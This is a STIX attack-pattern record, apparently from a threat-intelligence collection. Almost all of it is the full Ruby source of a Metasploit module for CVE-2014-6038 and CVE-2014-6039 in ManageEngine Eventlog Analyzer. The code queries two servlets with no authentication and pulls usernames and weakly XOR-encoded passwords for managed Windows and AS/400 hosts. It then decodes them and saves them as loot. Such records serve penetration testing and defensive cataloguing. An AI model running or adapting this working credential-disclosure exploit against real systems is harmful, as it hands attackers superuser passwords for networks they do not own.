{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--278a4de7-7c95-473b-a17a-d3bedeb5c1ae",
    "created": "2024-08-14T16:32:08.385939Z",
    "modified": "2024-08-14T16:32:08.385943Z",
    "name": "ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure",
    "description": " ManageEngine Eventlog Analyzer from v7 to v9.9 b9002 has two security vulnerabilities that allow an unauthenticated user to obtain the superuser password of any managed Windows and AS/400 hosts. This module abuses both vulnerabilities to collect all the available usernames and passwords. First the agentHandler servlet is abused to get the hostid and",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/eventlog_cred_disclosure.rb",
            "external_id": "eventlog_cred_disclosure.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6038"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6039"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Nov/12"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure',\n      'Description' => %q{\n        ManageEngine Eventlog Analyzer from v7 to v9.9 b9002 has two security vulnerabilities that\n        allow an unauthenticated user to obtain the superuser password of any managed Windows and\n        AS/400 hosts. This module abuses both vulnerabilities to collect all the available\n        usernames and passwords. First the agentHandler servlet is abused to get the hostid and\n        slid of each device (CVE-2014-6038); then these numeric IDs are used to extract usernames\n        and passwords by abusing the hostdetails servlet (CVE-2014-6039). Note that on version 7,\n        the TARGETURI has to be prepended with /event.\n      },\n      'Author' =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          [ 'CVE', '2014-6038' ],\n          [ 'CVE', '2014-6039' ],\n          [ 'OSVDB', '114342' ],\n          [ 'OSVDB', '114344' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Nov/12' ]\n        ],\n      'DisclosureDate' => '2014-11-05'))\n\n    register_options(\n      [\n        Opt::RPORT(8400),\n        OptString.new('TARGETURI', [ true,  'Eventlog Analyzer application URI (should be /event for version 7)', '/']),\n      ])\n  end\n\n\n  def decode_password(encoded_password)\n    password_xor = Rex::Text.decode_base64(encoded_password)\n    password = ''\n    password_xor.bytes.each do |byte|\n      password << (byte ^ 0x30)\n    end\n    return password\n  end\n\n\n  def run\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'agentHandler'),\n      'method' =>'GET',\n      'vars_get' => {\n        'mode' => 'getTableData',\n        'table' => 'HostDetails'\n      }\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::NotFound, \"#{peer} - Failed to reach agentHandler servlet\")\n      return\n    end\n\n    # When passwords have digits the XML parsing will fail.\n    # Replace with an empty password attribute so that we know the device has a password\n    # and therefore we want to add it to our host list.\n    xml = res.body.to_s.gsub(/&#[0-9]*;/,Rex::Text.rand_text_alpha(6))\n    begin\n      doc = REXML::Document.new(xml)\n    rescue\n      fail_with(Failure::Unknown, \"#{peer} - Error parsing the XML, dumping output #{xml}\")\n    end\n\n    slid_host_ary = []\n    doc.elements.each('Details/HostDetails') do |ele|\n      if ele.attributes['password']\n        # If an element doesn't have a password, then we don't care about it.\n        # Otherwise store the slid and host_id to use later.\n        slid_host_ary << [ele.attributes['slid'], ele.attributes['host_id']]\n      end\n    end\n\n    cred_table = Rex::Text::Table.new(\n      'Header'  => 'ManageEngine EventLog Analyzer Managed Devices Credentials',\n      'Indent'  => 1,\n      'Columns' =>\n        [\n          'Host',\n          'Type',\n          'SubType',\n          'Domain',\n          'Username',\n          'Password',\n        ]\n    )\n\n    slid_host_ary.each do |host|\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'hostdetails'),\n        'method' =>'GET',\n        'vars_get' => {\n          'slid' => host[0],\n          'hostid' => host[1]\n        }\n      })\n\n      unless res && res.code == 200\n        fail_with(Failure::NotFound, \"#{peer} - Failed to reach hostdetails servlet\")\n      end\n\n      begin\n        doc = REXML::Document.new(res.body)\n      rescue\n        fail_with(Failure::Unknown, \"#{peer} - Error parsing the XML, dumping output #{res.body.to_s}\")\n      end\n\n      doc.elements.each('Details/Hosts') do |ele|\n        # Add an empty string if a variable doesn't exist, we have to check it\n        # somewhere and it's easier to do it here.\n        host_ipaddress = ele.attributes['host_ipaddress'] || ''\n\n        ele.elements.each('HostDetails') do |details|\n          domain_name = details.attributes['domain_name'] || ''\n          username = details.attributes['username'] || ''\n          password_encoded = details.attributes['password'] || ''\n          password = decode_password(password_encoded)\n          type = details.attributes['type'] || ''\n          subtype = details.attributes['subtype'] || ''\n\n          unless type =~ /Windows/ || subtype =~ /Windows/\n            # With AS/400 we get some garbage in the domain name even though it doesn't exist\n            domain_name = \"\"\n          end\n\n          msg = \"Got login to #{host_ipaddress} | running \"\n          msg << type << (subtype != '' ? \" | #{subtype}\" : '')\n          msg << ' | username: '\n          msg << (domain_name != '' ? \"#{domain_name}\\\\#{username}\" : username)\n          msg << \" | password: #{password}\"\n          print_good(msg)\n\n          cred_table << [host_ipaddress, type, subtype, domain_name, username, password]\n\n          if type == 'Windows'\n            service_name = 'epmap'\n            port = 135\n          elsif type == 'IBM AS/400'\n            service_name = 'as-servermap'\n            port = 449\n          else\n            next\n          end\n\n          credential_core = report_credential_core({\n             password: password,\n             username: username,\n           })\n\n          host_login_data = {\n            address: host_ipaddress,\n            service_name: service_name,\n            workspace_id: myworkspace_id,\n            protocol: 'tcp',\n            port: port,\n            core: credential_core,\n            status: Metasploit::Model::Login::Status::UNTRIED\n          }\n          create_credential_login(host_login_data)\n        end\n      end\n    end\n\n    print_line\n    print_line(\"#{cred_table}\")\n    loot_name     = 'manageengine.eventlog.managed_hosts.creds'\n    loot_type     = 'text/csv'\n    loot_filename = 'manageengine_eventlog_managed_hosts_creds.csv'\n    loot_desc     = 'ManageEngine Eventlog Analyzer Managed Hosts Administrator Credentials'\n    p = store_loot(\n      loot_name,\n      loot_type,\n      rhost,\n      cred_table.to_csv,\n      loot_filename,\n      loot_desc)\n    print_status \"Credentials saved in: #{p}\"\n  end\n\n\n  def report_credential_core(cred_opts={})\n    # Set up the has for our Origin service\n    origin_service_data = {\n      address: rhost,\n      port: rport,\n      service_name: (ssl ? 'https' : 'http'),\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: self.fullname,\n      private_type: :password,\n      private_data: cred_opts[:password],\n      username: cred_opts[:username]\n    }\n\n    credential_data.merge!(origin_service_data)\n    create_credential(credential_data)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-11-05"
}